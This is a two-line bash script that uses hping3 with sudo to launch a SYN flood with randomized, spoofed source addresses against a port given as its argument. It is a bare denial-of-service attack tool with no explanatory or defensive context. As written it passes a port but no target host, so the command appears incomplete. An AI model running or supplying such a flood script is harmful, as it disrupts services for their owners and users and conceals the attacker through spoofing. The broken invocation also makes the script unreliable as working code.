#!/bin/bash
sudo hping3 -S --flood --rand-source -V -p $1
